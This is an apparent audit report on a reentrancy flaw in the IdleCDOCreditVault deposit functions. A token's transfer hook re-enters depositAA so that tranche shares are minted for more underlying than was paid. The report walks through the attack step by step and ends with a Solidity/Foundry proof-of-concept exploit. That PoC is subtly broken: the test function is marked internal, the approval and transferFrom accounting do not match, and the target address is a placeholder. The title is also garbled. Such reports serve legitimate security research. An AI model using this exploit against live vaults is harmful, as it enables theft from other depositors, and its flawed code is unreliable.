### Title
Reentrant underlying-token transfer inflates tranche mints and insolvencies the credit vault - ([File: contracts/IdleCDOCreditVault.sol](contracts/IdleCDOCreditVault.sol))

### Summary
`IdleCDOCreditVault.depositAA` and `depositBB` expose the same deposit path used by `IdleCDOEpochVariant`, but neither public entry point nor the shared pull-payment accounting is protected by `nonReentrant`. [1](#0-0)  The deposit implementation records the underlying balance before `transferFrom`, performs the external token transfer, and mints shares based on the observed balance delta. [2](#0-1)  If the configured underlying token invokes a sender hook, the depositor can reenter the deposit entry point before the outer call performs its balance-delta mint, causing the outer call to count both transfers while the inner call also accounts for its own transfer.

### Finding Description
The vulnerable sequence occurs while ordinary deposits are enabled, before an epoch is running:

1. An allowed attacker approves the vault for 100 tokens and calls `depositAA(50)`.
2. The vault records a pre-transfer balance of `B` and calls the underlying token's `transferFrom`.
3. The token invokes the attacker's sender hook after increasing the vault balance to `B + 50`.
4. The hook calls `depositAA(50)` again.
5. The inner call records `B + 50`, transfers another 50, observes a 50-token delta, mints shares for 50, and adds 50 to NAV.
6. The outer call resumes with the vault balance now reflecting both deposits. Its post-transfer balance minus the stale pre-transfer balance is 100, so it mints and accounts for another 100 shares.

The attacker therefore receives shares for 150 underlying after transferring only 100. The unguarded public deposit functions permit this nested call, while the balance-delta minting logic counts the nested transfer again in the outer frame. [3](#0-2)  The same accounting pattern is security-sensitive in `IdleCDOCreditVault` because its managed NAV consists of strategy tokens and underlying held by the CDO, net of fees. [4](#0-3) 

`IdleCDOEpochVariant._deposit` adds wallet authorization and donation skimming, then delegates into this deposit flow; it does not add a reentrancy guard. [5](#0-4)  The queued deposit implementation demonstrates the missing control: `requestDeposit` is explicitly marked `nonReentrant` before pulling underlying and updating queued balances. [6](#0-5) 

### Impact Explanation
Each level of reentry inflates the attacker's tranche balance and recorded NAV by one additional deposit amount. With two calls, a 100-token transfer creates 150 tokens' worth of recorded tranche NAV; deeper recursion increases the discrepancy proportionally.

The inflated tranche can later be redeemed or included in withdrawal accounting against assets belonging to other depositors. If the vault has sufficient assets, this is direct theft equal to the excess minted amount. If insufficient assets remain when claims are processed, withdrawals can revert or leave later claimants unpaid, causing insolvency and potentially freezing funds.

### Likelihood Explanation
Exploitation requires the pool's configured underlying token to execute attacker-controlled code during `transferFrom`, such as a sender hook, and requires the attacker to satisfy the applicable wallet/KYC check. The attacker needs no privileged role, and the vulnerable state is the ordinary deposit-enabled buffer phase. The strongest constraint is asset dependency: plain ERC20 tokens without transfer hooks do not provide the required callback.

Existing controls do not prevent the issue. `whenNotPaused` does not stop reentry, wallet validation only checks `msg.sender`, and donation skimming occurs before the nested pull. The queue's `nonReentrant` modifier protects `requestDeposit`, but it does not protect direct `depositAA` or `depositBB`. [7](#0-6) 

### Recommendation
Apply a shared `nonReentrant` guard to every public entry point that reaches the credit-vault `_deposit` implementation, including `depositAA`, `depositBB`, referral variants where present, and `depositDuringEpoch` for defense in depth. Alternatively, guard the internal `_deposit` itself and ensure external nonReentrant wrappers cannot create a cross-function bypass.

Also consider replacing balance-delta minting with minting based on the requested amount after enforcing that the token does not charge fees or invoke hooks, although this latter change alone would not prevent callback-based state manipulation and should not replace a reentrancy guard.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IHookCDO {
    function depositAA(uint256 amount) external returns (uint256);
    function AATranche() external view returns (address);
    function getContractValue() external view returns (uint256);
}

interface ITranche {
    function balanceOf(address account) external view returns (uint256);
}

contract HookToken is Test {
    IHookCDO public cdo;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    bool internal reentered;

    constructor(IHookCDO _cdo) {
        cdo = _cdo;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(allowances[from][msg.sender] >= amount, "allowance");
        require(balances[from] >= amount, "balance");

        allowances[from][msg.sender] -= amount;
        balances[from] -= amount;
        balances[to] += amount;

        // ERC777-style sender hook.
        if (from == address(this)) {
            if (!reentered) {
                reentered = true;
                cdo.depositAA(amount);
            }
        }
        return true;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }
}

contract ReentrantDepositTest is Test {
    function testDepositReentrancyInflatesTrancheNAV() internal {
        // Deploy or fork-initialize IdleCDOCreditVault/IdleCDOEpochVariant with
        // HookToken as `token`, deposits unpaused, no active epoch, and the
        // attacker marked as wallet-allowed.
        IHookCDO cdo = IHookCDO(address(/* deployed epoch CDO */));
        HookToken token = new HookToken(cdo);

        uint256 amount = 50 ether;
        token.mint(address(token), 2 * amount);
        token.approve(address(cdo), type(uint256).max);

        uint256 minted = cdo.depositAA(amount);
        address tranche = cdo.AATranche();

        // Expected vulnerable result:
        // - actual tokens contributed: 100 ether
        // - NAV/share credit created: 150 ether
        assertEq(token.balanceOf(address(cdo)), 100 ether);
        assertEq(ITranche(tranche).balanceOf(address(token)), 150 ether);
        assertEq(cdo.getContractValue(), 150 ether);
        assertGt(minted + 50 ether, 100 ether);
    }
}
```

The concrete assertion that demonstrates the invariant break is `tranche shares or NAV > actual underlying transferred`: the inner deposit mints for 50, while the outer deposit calculates a 100-token post-transfer delta from its stale pre-transfer balance.
